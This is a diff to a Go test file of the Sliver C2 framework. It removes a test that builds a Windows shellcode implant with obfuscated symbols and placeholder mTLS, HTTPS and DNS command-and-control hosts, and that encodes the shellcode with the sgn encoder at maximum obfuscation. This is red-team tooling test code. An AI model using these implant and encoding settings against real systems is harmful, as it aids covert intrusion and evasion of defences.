@@ -28,7 +28,6 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/server/certs"
 	"github.com/bishopfox/sliver/server/configs"
-	"github.com/bishopfox/sliver/server/encoders/shellcode/sgn"
 )
 
 var (
@@ -136,10 +135,6 @@ func TestSliverSharedLibWindows(t *testing.T) {
 	// 386
 	multiLibrary(t, "windows", "386", true)
 	multiLibrary(t, "windows", "386", false)
-
-	// Shared Library Shellcode
-	multiWindowsLibraryShellcode(t, true)
-	multiWindowsLibraryShellcode(t, false)
 }
 
 func TestSliverExecutableLinux(t *testing.T) {
@@ -540,54 +535,6 @@ func multiLibrary(t *testing.T, goos string, goarch string, debug bool) {
 		t.Fatalf("%v", err)
 	}
 	cleanupGeneratedArtifacts(t, binPath)
-}
-
-func multiWindowsLibraryShellcode(t *testing.T, debug bool) {
-	t.Logf("[multi] SHELLCODE windows/amd64 - debug: %v", debug)
-	name := fmt.Sprintf("multilibrary_shellcode_test%d", nonce)
-	config := &clientpb.ImplantConfig{
-		GOOS:   "windows",
-		GOARCH: "amd64",
-
-		C2: []*clientpb.ImplantC2{
-			{URL: "mtls://1.example.com"},
-			{Priority: 2, URL: "mtls://2.example.com"},
-			{URL: "https://3.example.com"},
-			{URL: "dns://4.example.com", Options: "asdf"},
-		},
-		Debug:            debug,
-		ObfuscateSymbols: true,
-		Format:           clientpb.OutputFormat_SHELLCODE,
-		IsShellcode:      true,
-		IsSharedLib:      false,
-		Exports:          []string{"FoobarW"},
-		IncludeMTLS:      true,
-		IncludeHTTP:      true,
-		IncludeDNS:       true,
-	}
-	httpC2Config := configs.GenerateDefaultHTTPC2Config()
-	nonce++
-	build, _ := GenerateConfig(name, config)
-	binPath, err := SliverShellcode(name, build, config, httpC2Config.ImplantConfig)
-	if err != nil {
-		t.Fatalf("%v", err)
-	}
-	defer cleanupGeneratedArtifacts(t, binPath)
-
-	// encode bin with sgn
-	bin, err := os.ReadFile(binPath)
-	if err != nil {
-		t.Fatalf("reading generated shared lib shellcode failed: %v", err)
-	}
-	_, err = sgn.EncodeShellcodeWithConfig(bin, sgn.SGNConfig{
-		Iterations:     1,
-		PlainDecoder:   false,
-		Safe:           true,
-		MaxObfuscation: 100,
-	})
-	if err != nil {
-		t.Fatalf("sgn encode failed: %v", err)
-	}
 }
 
 func symbolObfuscation(t *testing.T, goos string, goarch string) {
